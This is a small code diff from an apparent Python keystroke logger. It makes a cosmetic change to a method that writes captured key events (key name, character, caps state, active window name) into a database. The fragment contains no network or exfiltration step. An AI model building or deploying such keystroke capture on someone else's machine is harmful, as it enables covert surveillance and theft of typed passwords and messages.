@@ -20,7 +20,7 @@ class Process:
         self.appendWord(payload)
     
     def pushDB_keys():
-        (main_cfg, mycursor) = db_cursor()
+        main_cfg, mycursor = db_cursor()
         sql = f"INSERT INTO {main_cfg['dbKeyTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
         val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
   
